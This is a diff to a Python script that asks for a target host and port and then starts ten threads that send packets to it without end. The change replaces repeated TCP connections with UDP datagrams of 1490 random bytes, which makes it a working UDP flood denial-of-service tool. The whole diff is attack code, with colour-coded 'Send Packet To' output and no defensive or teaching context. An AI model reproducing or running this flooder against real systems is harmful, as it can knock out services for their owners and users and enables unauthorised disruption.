@@ -12,6 +12,7 @@ import sys
 import socket
 import threading
 import platform
+import random
 system = platform.uname()[0]
 def title():
     if system == 'Linux':
@@ -52,6 +53,7 @@ def menu():
     port = int(input("\nEnter Target port: "))
     ##################################################
     UDP_PORT = port
+    bs = random._urandom(1490)
     time.sleep(1)
     cls()
     ip = socket.gethostbyname(host)
@@ -61,11 +63,12 @@ def menu():
     print("\nTarget port:", UDP_PORT)
     print(color.red + "=============================================================================\n" + color.End)
     time.sleep(2)
+    sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
     def run(k):
         while True:
-             s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-             s.connect((host,port))
-             print(f"Packet send To {ip}")
+            sock.sendto(bs,(ip,port))
+            print(f"{Fore.GREEN}Send Packet To {Fore.RED}{ip}{Fore.WHITE}")
+            
     for i in range(10):
         ch = threading.Thread(target=run, args=[i])
         ch.start()
